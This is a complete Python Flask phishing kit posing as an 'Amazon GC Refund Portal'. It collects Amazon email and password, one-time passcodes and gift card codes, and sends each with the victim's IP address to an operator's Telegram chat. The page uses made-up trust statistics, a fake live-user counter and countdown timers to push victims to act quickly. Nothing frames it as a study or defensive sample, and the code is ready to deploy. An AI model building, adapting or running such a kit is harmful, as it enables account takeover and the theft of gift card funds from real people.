import os
import random
import string
import json
import requests
import secrets
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '')
BOT_USERNAME = os.environ.get('BOT_USERNAME', 'AmazonRefunderBot')

# In-memory storage
user_sessions = {}
redeem_codes = {}
transactions = {}

# Helper Functions
def generate_txid():
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"AMZ{timestamp}{random_str}"

def generate_redeem_token():
    return f"RDM-{''.join(random.choices(string.ascii_uppercase + string.digits, k=14))}"

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not ADMIN_CHAT_ID:
        print("Telegram not configured")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(url, json={
            'chat_id': ADMIN_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

# HTML Template (embedded directly)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon GC Refund Portal | Official Refund Service</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-green: #00ff41;
            --primary-red: #ff0040;
            --primary-blue: #0088ff;
            --dark-bg: #0a0a0f;
            --darker-bg: #050508;
            --card-bg: rgba(10, 10, 15, 0.95);
            --glow-green: rgba(0, 255, 65, 0.3);
            --glow-red: rgba(255, 0, 64, 0.3);
        }

        body {
            background: var(--dark-bg);
            color: var(--primary-green);
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            overflow-x: hidden;
            position: relative;
        }

        /* Matrix Background */
        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.12;
            pointer-events: none;
        }

        /* Scanline Effect */
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0, 255, 65, 0.03) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 2;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }

        /* Glitch Effect */
        .glitch {
            font-size: 2.5rem;
            font-weight: bold;
            text-transform: uppercase;
            position: relative;
            text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75);
            animation: glitch 0.3s infinite;
            text-align: center;
            letter-spacing: 2px;
        }

        @keyframes glitch {
            0%, 100% { text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 0, 0.75); }
            25% { text-shadow: -0.05em 0 0 rgba(0, 255, 0, 0.75), 0.05em 0.025em 0 rgba(255, 0, 0, 0.75); }
            50% { text-shadow: 0.05em 0.025em 0 rgba(0, 255, 0, 0.75), -0.05em 0 0 rgba(255, 0, 0, 0.75); }
            75% { text-shadow: -0.05em 0.025em 0 rgba(255, 0, 0, 0.75), 0.05em 0 0 rgba(0, 255, 0, 0.75); }
        }

        .container {
            position: relative;
            z-index: 1;
            max-width: 1300px;
            margin: 0 auto;
            padding: 2rem;
        }

        /* Cards */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 15px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px var(--glow-green);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 35px var(--glow-green);
        }

        /* Stats Cards */
        .stats-container {
            display: flex;
            gap: 1.5rem;
            justify-content: center;
            flex-wrap: wrap;
            margin: 2rem 0;
        }

        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 10px;
            padding: 1.5rem;
            text-align: center;
            flex: 1;
            min-width: 150px;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px var(--glow-green);
        }

        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: var(--primary-green);
        }

        /* Buttons */
        .btn {
            padding: 1rem 2rem;
            font-size: 1rem;
            font-family: monospace;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn:hover::before {
            width: 300px;
            height: 300px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00ff41, #00cc33);
            color: #000;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
        }

        .btn-primary:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.8);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #ff0040, #cc0033);
            color: #fff;
            box-shadow: 0 0 20px rgba(255, 0, 64, 0.5);
        }

        .btn-secondary:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255, 0, 64, 0.8);
        }

        /* Inputs */
        .input-group {
            margin: 1.5rem 0;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 1rem;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--primary-green);
            border-radius: 8px;
            color: var(--primary-green);
            font-family: monospace;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            box-shadow: 0 0 15px var(--glow-green);
            border-color: #00ffaa;
        }

        .input-group label {
            position: absolute;
            left: 1rem;
            top: -0.8rem;
            background: var(--dark-bg);
            padding: 0 0.5rem;
            font-size: 0.8rem;
            color: var(--primary-green);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: var(--darker-bg);
            border: 2px solid var(--primary-green);
            border-radius: 15px;
            padding: 2rem;
            max-width: 500px;
            width: 90%;
            animation: modalSlideIn 0.3s ease;
        }

        @keyframes modalSlideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* Timer */
        .timer {
            font-size: 2.5rem;
            font-weight: bold;
            text-align: center;
            margin: 1rem 0;
            color: #ffc107;
            text-shadow: 0 0 10px rgba(255, 193, 7, 0.5);
            font-family: monospace;
        }

        /* Copy Button */
        .copy-btn {
            background: transparent;
            border: 1px solid var(--primary-green);
            color: var(--primary-green);
            padding: 0.5rem 1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s ease;
            font-family: monospace;
        }

        .copy-btn:hover {
            background: var(--primary-green);
            color: #000;
            box-shadow: 0 0 10px var(--glow-green);
        }

        /* Trust Badges */
        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 2rem 0;
        }

        .trust-item {
            padding: 0.5rem 1rem;
            background: rgba(0, 255, 65, 0.1);
            border-radius: 20px;
            border: 1px solid var(--primary-green);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        /* Text Colors */
        .text-cyan { color: #00ffff; text-shadow: 0 0 5px #00ffff; }
        .text-green { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
        .text-yellow { color: #ffc107; text-shadow: 0 0 5px #ffc107; }
        .text-orange { color: #ff6b35; text-shadow: 0 0 5px #ff6b35; }
        .text-pink { color: #ff69b4; text-shadow: 0 0 5px #ff69b4; }
        .text-purple { color: #9b59b6; text-shadow: 0 0 5px #9b59b6; }

        /* Spinner */
        .spinner {
            border: 3px solid rgba(0, 255, 65, 0.3);
            border-top: 3px solid var(--primary-green);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 1rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Features Grid */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .glitch { font-size: 1.5rem; }
            .btn { padding: 0.75rem 1.5rem; font-size: 0.8rem; }
            .container { padding: 1rem; }
            .stats-container { flex-direction: column; }
        }

        .footer {
            text-align: center;
            padding: 2rem;
            border-top: 1px solid rgba(0, 255, 65, 0.3);
            margin-top: 3rem;
        }

        .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        code {
            background: rgba(0, 0, 0, 0.8);
            padding: 0.5rem;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9rem;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <canvas id="matrix-bg"></canvas>

    <div class="container">
        <!-- Header -->
        <div class="glitch">AMAZON GIFT CARD (GC) REFUND</div>

        <!-- Stats -->
        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-number" id="liveUsers">2,847</div>
                <div>Active Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalRefund">$3.2M</div>
                <div>Total Refunded</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="successRate">99.8%</div>
                <div>Success Rate</div>
            </div>
        </div>

        <!-- Description -->
        <div class="card">
            <p style="font-size: 1.1rem; line-height: 1.8;">
                <span class="text-cyan">⚡ INSTANT REFUND SYSTEM v5.0</span><br><br>
                <span class="text-green">✓ 100% Working & Genuine Service</span> | 
                <span class="text-yellow">✓ Trusted by 50,000+ Users</span> | 
                <span class="text-orange">✓ 99.9% Success Rate</span><br>
                <span class="text-pink">💰 Refund processed in <strong class="blink">5-10 minutes</strong></span><br>
                <span class="text-purple">🔒 Military Grade Encryption</span> | 
                <span class="text-cyan">🛡️ 100% Anonymous & Secure</span><br>
                <span class="text-green">🏆 #1 Amazon Refund Service 2024-2025</span>
            </p>
        </div>

        <!-- Trust Badges -->
        <div class="trust-badges">
            <div class="trust-item">✅ 100% Working</div>
            <div class="trust-item">⭐ Genuine Service</div>
            <div class="trust-item">🔒 Trusted Platform</div>
            <div class="trust-item">⚡ Instant Processing</div>
            <div class="trust-item">🎯 50k+ Refunds</div>
            <div class="trust-item">🛡️ Secure & Safe</div>
        </div>

        <!-- Main Buttons -->
        <div style="display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap; margin: 2rem 0;">
            <button class="btn btn-primary" onclick="showAccountModal()">
                🔐 I HAVE MY AMAZON ACCOUNT
            </button>
            <button class="btn btn-secondary" onclick="showCodeModal()">
                🎫 I HAVE A REDEEM CODE TO RETURN
            </button>
        </div>

        <!-- Features -->
        <div class="card">
            <h3 style="color: #ffc107; margin-bottom: 1rem;">⚡ Why Choose Us?</h3>
            <div class="features-grid">
                <div>🚀 <span class="text-green">5-10 Min Refund</span></div>
                <div>💎 <span class="text-cyan">No Hidden Fees</span></div>
                <div>🔐 <span class="text-yellow">Bank-Level Security</span></div>
                <div>🎯 <span class="text-orange">99.9% Success Rate</span></div>
                <div>🤝 <span class="text-pink">24/7 Support</span></div>
                <div>📜 <span class="text-purple">Verified Service</span></div>
            </div>
        </div>
    </div>

    <!-- Account Modal -->
    <div id="accountModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #00ff41; margin-bottom: 1rem;">🔐 Account Refund</h2>
            <div class="input-group">
                <label>Amazon Email / Phone</label>
                <input type="text" id="amazonEmail" placeholder="Enter your email or phone">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="amazonPassword" placeholder="Enter your password">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center;">
                <button class="btn btn-primary" onclick="submitAccount()">Continue →</button>
                <button class="copy-btn" onclick="closeModal('accountModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Code Modal -->
    <div id="codeModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ff6b35; margin-bottom: 1rem;">🎫 Gift Card Refund</h2>
            <div class="input-group">
                <label>Gift Card Code</label>
                <input type="text" id="giftCode" placeholder="Enter Amazon gift card code">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center;">
                <button class="btn btn-secondary" onclick="submitCode()">Process Refund →</button>
                <button class="copy-btn" onclick="closeModal('codeModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- OTP Modal -->
    <div id="otpModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ffc107; margin-bottom: 1rem;">📱 OTP Verification</h2>
            <p>Enter verification code sent to your email/phone</p>
            <div class="input-group">
                <label>OTP Code</label>
                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center;">
                <button class="btn btn-primary" onclick="verifyOTP()">Verify →</button>
                <button class="copy-btn" onclick="closeModal('otpModal')">Cancel</button>
            </div>
        </div>
    </div>

    <!-- Processing Modal -->
    <div id="processingModal" class="modal">
        <div class="modal-content" style="text-align: center;">
            <div class="spinner"></div>
            <h3 id="processingTitle">Processing Your Request...</h3>
            <p id="processingMessage">Please wait while we verify your information</p>
        </div>
    </div>

    <!-- Result Modal -->
    <div id="resultModal" class="modal">
        <div class="modal-content">
            <h2 id="resultTitle" style="text-align: center;"></h2>
            <div id="resultContent" style="text-align: center; margin: 1rem 0;"></div>
            <div class="timer" id="timerDisplay">30:00</div>
            <div id="resultMessage" style="margin: 1rem 0; text-align: center;"></div>
            <div class="alert alert-warning" style="background: rgba(255,193,7,0.1); padding: 1rem; border-radius: 5px; margin: 1rem 0; text-align: center;">
                ⚠️ Copy your ID and send it to <strong>@{{ bot_username }}</strong> on Telegram
            </div>
            <div style="text-align: center;">
                <button class="copy-btn" onclick="closeModal('resultModal')">Close</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>© 2024 Amazon Refund Service | 24/7 Support | Secure Connection</p>
        <p style="font-size: 0.8rem;">🔒 Encrypted | 💳 Instant Refund | ⚡ 5-10 Minutes</p>
    </div>

    <script>
        // Matrix Background Effect
        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>/\\|";
        const fontSize = 14;
        let columns = canvas.width / fontSize;
        let drops = [];

        function initDrops() {
            columns = canvas.width / fontSize;
            drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * -100;
            }
        }
        initDrops();

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => {
            resizeCanvas();
            initDrops();
        });

        // Animated stats
        let liveUsers = 2847;
        setInterval(() => {
            liveUsers += Math.floor(Math.random() * 10) - 3;
            if (liveUsers < 2000) liveUsers = 2000;
            document.getElementById('liveUsers').innerHTML = liveUsers.toLocaleString();
        }, 5000);

        let currentTxid = null;
        let timerInterval = null;

        function showAccountModal() {
            document.getElementById('accountModal').style.display = 'flex';
        }

        function showCodeModal() {
            document.getElementById('codeModal').style.display = 'flex';
        }

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
            if (timerInterval) clearInterval(timerInterval);
        }

        async function submitAccount() {
            const email = document.getElementById('amazonEmail').value.trim();
            const password = document.getElementById('amazonPassword').value;

            if (!email || !password) {
                alert('Please enter both email and password');
                return;
            }

            closeModal('accountModal');
            showProcessing('Account Verification', 'Connecting to Amazon servers...');

            try {
                const response = await fetch('/api/refund/account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                const data = await response.json();
                hideProcessing();

                if (data.success) {
                    currentTxid = data.txid;
                    document.getElementById('otpModal').style.display = 'flex';
                } else {
                    alert(data.error || 'Something went wrong');
                }
            } catch (err) {
                hideProcessing();
                alert('Network error. Please try again.');
            }
        }

        async function submitCode() {
            const giftCode = document.getElementById('giftCode').value.trim().toUpperCase();

            if (!giftCode) {
                alert('Please enter the gift card code');
                return;
            }

            closeModal('codeModal');
            showProcessing('Gift Card Processing', 'Verifying code validity...');

            try {
                const response = await fetch('/api/refund/code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ gift_code: giftCode })
                });

                const data = await response.json();
                hideProcessing();

                if (data.success) {
                    showCodeResult(data.redeem_token);
                } else {
                    alert(data.error || 'Something went wrong');
                }
            } catch (err) {
                hideProcessing();
                alert('Network error. Please try again.');
            }
        }

        async function verifyOTP() {
            const otp = document.getElementById('otpCode').value.trim();

            if (!otp || otp.length < 4) {
                alert('Please enter a valid OTP code');
                return;
            }

            closeModal('otpModal');
            showProcessing('OTP Verification', 'Verifying your code...');

            try {
                const response = await fetch('/api/otp/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txid: currentTxid, otp: otp })
                });

                const data = await response.json();
                hideProcessing();

                if (data.success) {
                    showAccountResult(currentTxid);
                } else {
                    alert(data.error || 'Invalid OTP');
                }
            } catch (err) {
                hideProcessing();
                alert('Network error. Please try again.');
            }
        }

        function showAccountResult(txid) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '✅ ACCOUNT SUBMITTED SUCCESSFULLY';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(0,255,65,0.1); padding: 1rem; border-radius: 5px;">
                    <p><strong>📌 Your TXID:</strong></p>
                    <code style="font-size: 1rem;">${txid}</code>
                    <div style="margin-top: 0.5rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${txid}')">📋 Copy TXID</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>IMPORTANT:</strong> Copy your TXID and send it to the Telegram bot!<br><br>
                ⏰ This TXID expires in 30 minutes<br>
                📌 Refund will be processed within 12 hours
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }

        function showCodeResult(redeemToken) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '🎫 GIFT CARD SUBMITTED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(255,107,53,0.1); padding: 1rem; border-radius: 5px;">
                    <p><strong>🔖 Your Redeem Token:</strong></p>
                    <code style="font-size: 1rem;">${redeemToken}</code>
                    <div style="margin-top: 0.5rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${redeemToken}')">📋 Copy Token</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>IMPORTANT:</strong> Copy your Token and send it to the Telegram bot!<br><br>
                ⏰ This token expires in 30 minutes<br>
                🚀 Refund will be generated in 5-10 minutes
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }

        function startTimer(minutes) {
            let time = minutes * 60;
            const timerDisplay = document.getElementById('timerDisplay');

            if (timerInterval) clearInterval(timerInterval);

            timerInterval = setInterval(() => {
                const mins = Math.floor(time / 60);
                const secs = time % 60;
                timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;

                if (time <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.innerHTML = 'EXPIRED';
                    timerDisplay.style.color = '#ff0040';
                }
                time--;
            }, 1000);
        }

        function showProcessing(title, message) {
            document.getElementById('processingTitle').innerHTML = title;
            document.getElementById('processingMessage').innerHTML = message;
            document.getElementById('processingModal').style.display = 'flex';
        }

        function hideProcessing() {
            document.getElementById('processingModal').style.display = 'none';
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('✓ Copied to clipboard!');
            }).catch(() => {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                alert('✓ Copied to clipboard!');
            });
        }

        window.onclick = function (event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
                if (timerInterval) clearInterval(timerInterval);
            }
        }

        // Blink animation
        setInterval(() => {
            const blinkElements = document.querySelectorAll('.blink');
            blinkElements.forEach(el => {
                el.style.opacity = el.style.opacity === '0' ? '1' : '0';
            });
        }, 500);
    </script>
</body>
</html>
"""

# Flask Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, bot_username=BOT_USERNAME)

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'active_sessions': len(user_sessions),
        'active_codes': len(redeem_codes)
    }), 200

@app.route('/api/refund/account', methods=['POST'])
def refund_account():
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '')
        
        if not email or not password:
            return jsonify({'error': 'Email and password required'}), 400
        
        txid = generate_txid()
        ip_address = get_client_ip()
        
        user_sessions[txid] = {
            'email': email,
            'password': password,
            'type': 'account',
            'ip': ip_address,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to Telegram
        message = f"""
🔐 <b>NEW ACCOUNT REFUND REQUEST</b> 🔐

📌 <b>TXID:</b> <code>{txid}</code>
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🌐 <b>IP:</b> {ip_address}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Pending OTP Verification
        """
        send_to_telegram(message)
        
        return jsonify({
            'success': True,
            'txid': txid,
            'message': 'Account submitted successfully'
        })
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    try:
        data = request.json
        gift_code = data.get('gift_code', '').strip().upper()
        
        if not gift_code:
            return jsonify({'error': 'Gift code required'}), 400
        
        redeem_token = generate_redeem_token()
        ip_address = get_client_ip()
        
        redeem_codes[redeem_token] = {
            'code': gift_code,
            'ip': ip_address,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to Telegram
        message = f"""
🎁 <b>NEW GIFT CARD REFUND REQUEST</b> 🎁

🔖 <b>Token:</b> <code>{redeem_token}</code>
💳 <b>Code:</b> <code>{gift_code}</code>
🌐 <b>IP:</b> {ip_address}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Processing Refund
        """
        send_to_telegram(message)
        
        return jsonify({
            'success': True,
            'redeem_token': redeem_token,
            'message': 'Gift card submitted successfully'
        })
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        txid = data.get('txid')
        otp = data.get('otp', '').strip()
        
        if not txid or not otp:
            return jsonify({'error': 'TXID and OTP required'}), 400
        
        if txid not in user_sessions:
            return jsonify({'error': 'Invalid session'}), 404
        
        user_sessions[txid]['otp'] = otp
        user_sessions[txid]['status'] = 'completed'
        user_sessions[txid]['otp_verified_at'] = datetime.now().isoformat()
        
        # Send OTP to admin
        message = f"""
✅ <b>OTP RECEIVED - ACCESS GRANTED</b> ✅

📌 <b>TXID:</b> <code>{txid}</code>
📱 <b>OTP Code:</b> <code>{otp}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Account Access Complete!</b>
📧 Email: {user_sessions[txid]['email']}
🔑 Password: {user_sessions[txid]['password']}
        """
        send_to_telegram(message)
        
        return jsonify({
            'success': True,
            'message': 'OTP verified successfully'
        })
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
